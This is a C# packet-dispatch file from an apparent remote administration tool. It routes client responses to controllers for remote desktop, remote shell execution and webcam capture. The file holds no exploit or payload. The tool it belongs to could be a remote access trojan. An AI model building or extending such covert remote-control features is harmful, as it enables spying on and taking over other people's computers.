using Serveur.Controllers;
using Serveur.Controllers.Server;
using Serveur.Packets.ClientPackets;
using System.Windows.Forms;

namespace Serveur.Packets
{
    public static class PacketHandler
    {
        public static void packetChecker(ClientMosaic client, IPackets packet)
        {
            var type = packet.Type;

            if (type == TypePackets.GetMonitorsResponse)
            {
                FrmRemoteDesktopController.getMonitorsResponse(client, (GetMonitorsResponse)packet);
            }
            else if(type == TypePackets.GetDesktopResponse)
            {
                FrmRemoteDesktopController.getDesktopResponse(client, (GetDesktopResponse)packet);
            }
            else if (type == TypePackets.GetExecuteShellCmdResponse)
            {
                FrmRemoteShellController.getShellCmdExecuteResponse(client, (GetExecuteShellCmdResponse)packet);
            }
            else if (type == TypePackets.GetAvailableWebcamsResponse)
            {
                FrmRemoteWebcamController.getAvailableWebcamsResponse(client, (GetAvailableWebcamsResponse)packet);
            }
            else if (type == TypePackets.GetWebcamResponse)
            {
                FrmRemoteWebcamController.getWebcamResponse(client, (GetWebcamResponse)packet);
            }
        }
    }
}
